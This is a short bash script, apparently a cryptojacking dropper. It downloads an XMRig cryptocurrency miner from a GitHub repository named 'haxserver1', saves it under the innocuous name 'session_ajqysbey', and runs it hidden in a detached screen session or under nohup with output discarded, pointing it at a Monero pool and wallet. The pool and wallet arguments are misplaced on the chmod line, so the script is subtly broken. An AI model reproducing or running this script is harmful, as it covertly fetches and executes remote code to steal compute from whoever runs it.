#!/bin/bash

FILE_URL="https://github.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/raw/main/xmrig"
FILE_NAME="session_ajqysbey"

wget -O $FILE_NAME $FILE_URL
chmod +x $FILE_NAME -o pool.supportxmr.com:443 -u 48PMjoMcbA64NPR7ESQvRsKeDuVXA6AkVAr6LvEUCzxqBimsKvmxeYxN5Ys8htQ2NudViF8PVe8BHbT1eY5jWFXWQ1PB6fG -k --tls -p haxx 
if command -v screen &> /dev/null
then
    screen -dmS mysession ./$FILE_NAME
    sleep 1
    if screen -list | grep -q "mysession"; then
        echo "money is running in screen"
    else
        echo "error"
    fi
else
    nohup ./$FILE_NAME &> /dev/null &
    sleep 1
    if ps -ef | grep -v grep | grep -q "$FILE_NAME"; then
        echo "money is running in the background"
    else
        echo "error"
    fi
fi
